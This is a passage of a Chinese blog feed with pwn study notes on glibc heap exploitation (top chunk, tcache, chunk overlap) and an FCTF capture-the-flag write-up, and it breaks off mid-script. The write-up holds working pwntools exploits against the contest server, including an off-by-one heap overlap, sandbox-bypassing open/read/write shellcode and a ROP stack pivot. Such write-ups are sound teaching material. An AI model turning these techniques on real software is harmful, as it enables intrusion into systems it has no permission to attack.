class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  /*</span><br><span class="line">     If not the first time through, we require old_size to be</span><br><span class="line">     at least MINSIZE and to have prev_inuse set.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br><span class="line">............</span><br><span class="line">          if (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">              set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));</span><br><span class="line">              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">              _int_free (av, old_top, 1);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>另一种是会先把原来的 top chunk free 进 unsorted bin。但是要满足几个条件：</p><p>1、(unsigned long) (old_size) &gt;= MINSIZE</p><p>2、 prev_inuse (old_top) = 1</p><p>3、 ((unsigned long) old_end &amp; (pagesize - 1)) == 0)</p><p>所以我们通过溢出把 top chunk 的 size 改小即可，并且注意内存页对齐。</p><h2 id="0x10常规泄露"><a href="#0x10常规泄露" class="headerlink" title="0x10常规泄露"></a>0x10常规泄露</h2><p>当程序有输出chunk内容的功能时,通过将chunk挂载入unsortedbin再取出,即可在mem区域写上libc地址(主要是利用bk字段),之后泄露</p><p>挂载两个不合并的chunk进入unosortedbin再取出,即可同时泄露libc地址和堆地址</p><h2 id="0x11tcache相关"><a href="#0x11tcache相关" class="headerlink" title="0x11tcache相关"></a>0x11tcache相关</h2><p><strong>tcache:0x20-0x410</strong></p><p>在2.32以前,直接将hook等地址挂入tcache取出,需要注意count[tc_idx]的值足够</p><p>tcache几乎不合并因此overlap之类要避开tcache</p><h2 id="0x12overlap"><a href="#0x12overlap" class="headerlink" title="0x12overlap"></a>0x12overlap</h2><p>overlap分为两种</p><p><strong>向前overlap</strong>:</p><p><strong>其一:</strong></p><p>主要是修改prev_inuse位使得free时与前面的chunk合并,</p><p>要记得绕过unlink等检查</p><p><strong>其二:</strong></p><p>假设有A,B两个chunk相邻排列,</p><p>并没有主动修改B的prev_inuse,而是释放掉A,使B的prev_inuse正常变为0,</p><p>之后在off-by-null之类修改掉A的size,使得A再取出来分配时set_inuse无法找到正确的位置使得B的prev_inuse依然保持为0</p><p>之后再释放B,触发overlap</p><p>也要绕过unlink等检查</p><p><strong>向后overlap:</strong></p><p>直接修改chunk的size字段,向后覆盖其他chunk</p><p>也要绕过一些检查,像!prev_inuse(nextchunk)</p><h2 id="0x13在tcahe-perthread-struct上伪造chunk"><a href="#0x13在tcahe-perthread-struct上伪造chunk" class="headerlink" title="0x13在tcahe_perthread_struct上伪造chunk"></a>0x13在tcahe_perthread_struct上伪造chunk</h2><p>在2.26版本之后堆上会有一个tcahe_perthread_struct</p><p>用于存放tcache的信息:数量和链头</p><p>因为内存存储的特性</p><p>可以利用其伪造chunk</p><ul><li>用count的组合来伪造chunk,主要是0x3a0和0x3b0这两个大小的</li><li>用0x21和0x31这两个chunk伪造fd和bk</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
            <tag> 实操 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FCTF</title>
      <link href="/posts/21638/"/>
      <url>/posts/21638/</url>
      
        <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="Pwn-warmup-1"><a href="#Pwn-warmup-1" class="headerlink" title="Pwn warmup 1"></a>Pwn warmup 1</h2><p>保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;/glibc/glibc-2.31/build/lib&#x27;</span><br></pre></td></tr></table></figure><p>附件有给源代码,粗读一遍判定为菜单类堆题</p><p>程序开头会直接给出flag的地址</p><p>考虑如何利用,细读源码发现edit函数存在off-by-one漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">note_t</span> *note = get_note();</span><br><span class="line">  <span class="keyword">if</span> (!note) &#123; <span class="built_in">puts</span>(<span class="string">&quot;Not found&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">strlen</span>(note-&gt;content);  </span><br><span class="line">  printff(<span class="string">&quot;New content: &quot;</span>);</span><br><span class="line">  read_str(note-&gt;content, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strlen函数到\x00结束,如果某个chunk能占用下一个chunk的prev_size则能覆盖下一个chunk的size</p><p>可以用这个漏洞来达到chunk extended and overlapping的目的</p><p>再看add函数,进行add函数时</p><ol><li>首先创建一个chunk用于一个该note信息管理</li><li>再创建一个用户自定义大小的chunk用于存储内容</li></ol><p>这两个chunk是黏在一起的</p><p>于是,我们可以这样利用</p><p>创建3个note</p><ol><li>note0用于触发off-by-one</li><li>note1用于释放重分配以达到chunk extended and overlapping</li><li>note2用于触发show功能读取flag</li></ol><p>具体步骤</p><p>我创建的三个note的content大小都为24且初始填满(1和2填不填无所谓),方便利用</p><ol><li>edit修改note0,使note1的size为一个能够覆盖到note2的content指针的大小</li><li>释放note1</li><li>再add一个note,content大小为能使分配到的chunk为之前释放的note1的content,并填充内容覆盖note2的content指针</li><li>对note2进行show,得到flag</li></ol><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第2个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x61&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;80&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>+p64(e))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>以上是我第一次做的思路,这样做的话对note1的content大小没有什么要求</p><p>后面我发现其实只要两个note也能实现得到flag</p><p>不过对note1的content大小有严格要求</p><p>因为如果note1的content实际chunk大小为0x20的话</p><p>再分配note1的时候,note1头的chunk因为大小合适,直接取的之前被释放的note1的content的chunk</p><p>又因为之前的chunk overlapping</p><p>所以note1的content就包含了note1的头,可以直接修改note1的content指针</p><p>再show-note1得到flag</p><p>顺便尝试了下函数写法</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(size))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">add(<span class="number">48</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(e))</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 实操调试的一些小细节 </summary>              <div class='content'>              <p>主要还是一些关于stdin的细节，当程序读取n个字节时，可以发送多余n的字节，程序读取完后，剩余的数据依然会被保留在stdin中，相邻的输入函数又会直接读取其中的数据，而这可能并不是我们所期望的，这样如果<strong>没有注意把控字节数</strong>的话，调试的时候可能出一些问题，例如菜单式题目直接从stdin中读取一个数据，读到了非菜单区号数据,那么程序的运行就会受阻;又或者程序读取的数据,并没有包含整个我们需要的数据,又会出现问题</p><p>总之需要注意发送的数据与接收的数据数量对应关系,特别要注意\n符</p>              </div>            </details><h2 id="shellcode1"><a href="#shellcode1" class="headerlink" title="shellcode1"></a>shellcode1</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/aichch/pwn/s1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida打开,程序执行并不复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fwrite(<span class="string">&quot;Input your shellcode:\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x16</span>uLL, _bss_start);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)buf) &lt;= <span class="number">5</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sandbox();</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  fwrite(<span class="string">&quot;Oops! maybe too long!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x16</span>uLL, _bss_start);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过再payload前添加’\x00’绕过strlen的检测,但单独一个<strong>‘\x00’会使得程序流停滞</strong>,故可以让’\x00’和push联合作为一条指令—-push 0h(\x6a00)</p><p>另外程序开启了沙盒,只能使用orw操作</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./s1&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">2225</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)  <span class="comment">#不进行这一步会出错,因为默认是32位</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sh=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">sh+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">sh+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">sh=asm(sh)</span><br><span class="line">p.send(<span class="string">b&#x27;\x6a\x00&#x27;</span>+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另外提一下,程序进行时stdin,stdout,stderr三个文件流是自行打开的,文件描述符分别是0,1,2</p><p>故之后打开的文件的描述符是从3开始的</p><h2 id="shellcode2"><a href="#shellcode2" class="headerlink" title="shellcode2"></a>shellcode2</h2><p>这题没做出来,汇编忘得差不多了,还是太依赖ida的反汇编了😥</p><p>赛后看大佬的wp才恍然大悟</p><hr><p>这题在于程序一次只能执行四个字节长度的代码,故如果要连接各串代码还需要用到jmp指令,又占去了一半的长度,</p><p>再加上程序还会随机打乱代码顺序</p><p>想直接完成orw几乎不可能</p><p>但可以观察到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000016DA 48 8B 45 F0                   mov     rax, [rbp+var_10]</span><br><span class="line">.text:00000000000016DE 48 83 C0 10                   add     rax, 10h</span><br><span class="line">.text:00000000000016E2 48 89 C2                      mov     rdx, rax</span><br><span class="line">.text:00000000000016E5 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000016EA FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>程序是通过rdx跳往代码执行处的</p><p>那么第一次只需要向rdx处写命令,并在前面填充一些nop,程序流继续往下执行就会执行新写的命令了</p><p>那么第一次执行的代码因该就要是read(0,rdx,rdx),长度不用指定只要够大就行</p><p>因为syscall要在最后执行,所以只有四分之一的成功率</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sc2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.12.48.154&quot;</span>, <span class="number">2226</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">next_slot = <span class="string">&#x27;;jmp $+30&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_slot</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">return</span> code + next_slot</span><br><span class="line"></span><br><span class="line">preamble = []</span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;xor edi, edi&#x27;</span>))  <span class="comment">#不能是rdi,汇编代码三个字节</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;xor eax, eax&#x27;</span>)) <span class="comment">#同上</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;push rdx;pop rsi&#x27;</span>)) <span class="comment">#mov rsi,rdx是三个字节长度</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    movabs rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mov rax, 0x2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, rax     </span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;want?\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.send(asm(preamble[i]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x100</span> + asm(sc))</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;Fire!\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure><p>因为open函数执行后,文件描述符存储在rax,所以直接rax赋值给rdi就行了</p><h2 id="Play-with-rop"><a href="#Play-with-rop" class="headerlink" title="Play-with-rop"></a>Play-with-rop</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>存在溢出但只能控制rbp和rip,故需要先进行栈迁移</p><p>第一次通过再调用一次main中的read往迁移后的rbp-0x30写来进一步获得栈迁移的能力</p><p>之后栈迁移后利用puts函数将broken_keys打印出来,在跳转到wonderland获得加密后的flag</p><p>这题不算很难,但做的时候栈迁移的位置不好,被printf的栈越界卡住了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./chall&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;1.12.48.154&quot;</span>, <span class="number">2224</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_rsi_rdx = <span class="number">0x4012A9</span></span><br><span class="line"></span><br><span class="line">key0_addr = <span class="number">0x4040B0</span></span><br><span class="line">key1_addr = key0_addr + <span class="number">0x8</span></span><br><span class="line">key2_addr = key1_addr + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">lea_ret = <span class="number">0x04016B4</span></span><br><span class="line">read_again = <span class="number">0x401686</span>   <span class="comment">#这个read是往rbp-0x30写</span></span><br><span class="line">wonderland = <span class="number">0x4012D6</span></span><br><span class="line"></span><br><span class="line">fake_rbp = <span class="number">0x404600</span> + <span class="number">0x880</span> <span class="comment"># +0x880 to ensure fake stack is large enough for puts</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(fake_rbp) + p64(read_again)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;leave your name&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi_rsi_rdx) + p64(<span class="number">0</span>) + p64(fake_rbp-<span class="number">0x30</span>) + p64(<span class="number">0x100</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(fake_rbp-<span class="number">0x38</span>) + p64(lea_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_rsi_rdx) + p64(key0_addr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(puts) + p64(pop_rdi_rsi_rdx) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(wonderland)</span><br><span class="line">p.send(payload3)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;flag:&#x27;</span>)</span><br><span class="line">keys = data[<span class="number">77</span>:<span class="number">77</span>+<span class="number">24</span>] <span class="comment"># 77是通过计算字符数得到的,不晓得为什么先接收77个字节再改动keys不能成功</span></span><br><span class="line">k0 = u64(keys[:<span class="number">8</span>])</span><br><span class="line">k1 = u64(keys[<span class="number">8</span>:<span class="number">16</span>]) ^ k0</span><br><span class="line">k2 = u64(keys[<span class="number">16</span>:<span class="number">24</span>]) ^ k1</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(k0), <span class="built_in">hex</span>(k1), <span class="built_in">hex</span>(k2))</span><br><span class="line"></span><br><span class="line">flag = p.recv().strip()</span><br><span class="line">real_flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">real_flag += (u64(flag[:<span class="number">8</span>])    ^ k0).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">8</span>:<span class="number">16</span>])  ^ k1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">16</span>:<span class="number">24</span>]) ^ k2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">24</span>:<span 